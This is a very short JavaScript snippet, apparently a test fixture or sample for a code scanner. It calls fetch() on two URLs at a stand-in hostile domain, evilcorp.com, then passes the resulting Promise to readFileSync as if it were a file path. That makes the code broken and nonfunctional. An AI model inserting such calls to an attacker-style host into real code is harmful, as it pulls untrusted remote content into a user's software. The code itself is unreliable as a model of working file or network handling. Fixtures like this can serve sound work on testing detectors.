import { readFileSync } from 'fs';

const files = [fetch('https://evilcorp.com/hacky'), fetch('https://evilcorp.com/hacky-hacky')];

const fileContents = readFileSync(files[0]);
